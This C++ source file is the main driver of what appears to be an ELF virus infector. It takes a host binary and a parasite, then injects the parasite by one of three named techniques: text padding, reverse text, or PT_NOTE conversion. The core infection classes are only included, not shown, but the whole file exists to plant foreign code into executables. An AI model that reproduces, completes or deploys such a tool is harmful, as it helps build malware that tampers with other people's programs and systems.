#include "common/string.hh"
#include "infector/common_infection.hh"
#include "infector/padding_infector.hh"
#include "infector/pt_note_infector.hh"
#include "infector/reverse_text_infector.hh"
#include "nostdlib/stdio.hh"

const char* TEXT_PADDING = "text_padding";
const char* REVERSE_TEXT = "reverse_text";
const char* PT_NOTE_TO_LOAD = "pt_note";

// Usage %s <host> <parasite> <infection method>
int main(int argc, char** argv) {
  if (argc != 4) {
    return EXIT_FAILURE;
  }

  auto method = argv[3];
  bool ret = false;

  if (vt::common::String(method) == TEXT_PADDING) {
    ret = vt::infector::infect<vt::infector::PaddingInfector>(argv[1], argv[2],
                                                              32);
  } else if (vt::common::String(method) == REVERSE_TEXT) {
    ret = vt::infector::infect<vt::infector::ReverseTextInfector>(argv[1],
                                                                  argv[2], 32);
  } else if (vt::common::String(method) == PT_NOTE_TO_LOAD) {
    ret = vt::infector::infect<vt::infector::PtNoteInfector>(argv[1], argv[2],
                                                             32);
  }

  return ret ? EXIT_SUCCESS : EXIT_FAILURE;
}